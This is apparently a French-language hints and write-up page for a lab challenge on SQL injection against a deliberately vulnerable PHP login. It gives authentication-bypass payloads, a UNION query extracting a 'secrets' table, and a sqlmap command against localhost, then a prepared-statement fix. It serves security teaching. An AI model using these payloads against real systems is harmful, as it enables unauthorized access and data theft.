<?php
// ─────────────────────────────────────────────
// VulnLab C01 — Hints & Write-up
// ─────────────────────────────────────────────
?>
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>C01 — Hints SQLi</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0f1117; color: #c8d0dc; min-height: 100vh; padding: 40px 24px; }
  .wrap { max-width: 720px; margin: 0 auto; }
  h1 { font-size: 22px; color: #e4e8f0; margin-bottom: 8px; }
  .subtitle { font-size: 13px; color: #5a6475; margin-bottom: 36px; }
  h2 { font-size: 14px; font-weight: 600; color: #e4e8f0; margin: 28px 0 10px; text-transform: uppercase; letter-spacing: 0.06em; }
  p { font-size: 14px; line-height: 1.7; color: #8a94a6; margin-bottom: 10px; }
  code, pre { font-family: 'Courier New', monospace; }

  .hint-card {
    background: #151a22; border: 1px solid rgba(255,255,255,0.06);
    border-radius: 10px; padding: 18px 20px; margin-bottom: 14px;
  }
  .hint-level { font-size: 10px; letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 8px; }
  .level-1 { color: #5db84a; }
  .level-2 { color: #e8a820; }
  .level-3 { color: #e84a4a; }

  .code-block {
    background: #1e1e2e; border-radius: 8px; padding: 14px 16px;
    font-size: 12px; color: #cdd6f4; line-height: 1.8; margin: 10px 0;
    overflow-x: auto; white-space: pre;
  }
  .kw { color: #cba6f7; }
  .str { color: #a6e3a1; }
  .cmt { color: #6c7086; font-style: italic; }
  .op  { color: #89dceb; }

  .tag {
    display: inline-block; padding: 2px 8px; border-radius: 4px;
    font-size: 11px; font-family: monospace;
    background: rgba(45,110,247,0.15); color: #7aa8ff; margin: 2px;
  }
  a { color: #4a9eff; }
  .back { display:inline-flex; align-items:center; gap:6px; font-size:13px; color:#4a9eff; text-decoration:none; margin-bottom:28px; }
</style>
</head>
<body>
<div class="wrap">
  <a class="back" href="/">← Retour au login</a>
  <h1>Challenge C01 — SQL Injection</h1>
  <p class="subtitle">PHP 8 · MySQL 8 · Authentification vulnérable</p>

  <p>La page de login construit sa requête SQL par concaténation directe de l'input utilisateur, sans paramétrage ni échappement. L'objectif est de bypasser l'authentification et d'accéder au panneau admin.</p>

  <h2>Outils suggérés</h2>
  <span class="tag">Burp Suite</span>
  <span class="tag">sqlmap</span>
  <span class="tag">curl</span>
  <span class="tag">navigateur</span>

  <h2>Indices progressifs</h2>

  <div class="hint-card">
    <div class="hint-level level-1">Indice 1 — Facile</div>
    <p>La requête SQL a la forme :</p>
    <div class="code-block"><span class="kw">SELECT</span> * <span class="kw">FROM</span> users <span class="kw">WHERE</span> username = <span class="str">'[INPUT]'</span> <span class="kw">AND</span> password = <span class="str">'[INPUT]'</span></div>
    <p>Que se passe-t-il si on termine la chaîne prématurément avec un apostrophe ?</p>
  </div>

  <div class="hint-card">
    <div class="hint-level level-2">Indice 2 — Moyen</div>
    <p>Le commentaire SQL <code>--</code> (ou <code>#</code>) ignore tout ce qui suit sur la même ligne. Combinez-le avec une condition toujours vraie :</p>
    <div class="code-block"><span class="cmt">-- Dans le champ username :</span>
admin<span class="str">'</span> <span class="op">--</span>
<span class="cmt">-- Ou pour bypasser sans connaître l'username :</span>
<span class="str">' OR '1'='1</span><span class="op"> --</span></div>
  </div>

  <div class="hint-card">
    <div class="hint-level level-3">Indice 3 — Solution complète</div>
    <p>Payload pour se connecter directement en tant qu'admin (premier utilisateur avec role=admin) :</p>
    <div class="code-block"><span class="cmt">Username :</span>  admin<span class="str">'</span> <span class="op">--</span>
<span class="cmt">Password :</span>  (n'importe quoi)

<span class="cmt">-- Requête résultante :</span>
<span class="kw">SELECT</span> * <span class="kw">FROM</span> users <span class="kw">WHERE</span> username = <span class="str">'admin'</span> <span class="op">--</span>' <span class="kw">AND</span> password = <span class="str">'x'</span>
<span class="cmt">↑ La condition password est commentée → toujours vrai</span></div>

    <p>Bonus — UNION-based pour exfiltrer la table <code>secrets</code> depuis la recherche admin :</p>
    <div class="code-block"><span class="cmt">Dans le champ search de /admin.php :</span>
x<span class="str">' UNION SELECT id, name, value FROM secrets -- </span>

<span class="cmt">Automatiser avec sqlmap :</span>
sqlmap -u <span class="str">"http://localhost/c01/?username=admin&password=x"</span> \
       --data <span class="str">"username=admin&password=x"</span> \
       --method POST --dbs --batch</div>
  </div>

  <h2>Correction (code sécurisé)</h2>
  <p>Utiliser des <strong>requêtes préparées</strong> avec <code>mysqli_prepare()</code> :</p>
  <div class="code-block"><span class="cmt">// ✅ Version sécurisée</span>
$stmt = mysqli_prepare($conn,
    <span class="str">"SELECT * FROM users WHERE username = ? AND password = ?"</span>
);
mysqli_stmt_bind_param($stmt, <span class="str">'ss'</span>, $username, $password);
mysqli_stmt_execute($stmt);</div>

  <h2>Références</h2>
  <p>
    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP — SQL Injection</a> ·
    <a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQLi Labs</a> ·
    <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank">OWASP Top 10 A03:2021</a>
  </p>
</div>
</body>
</html>
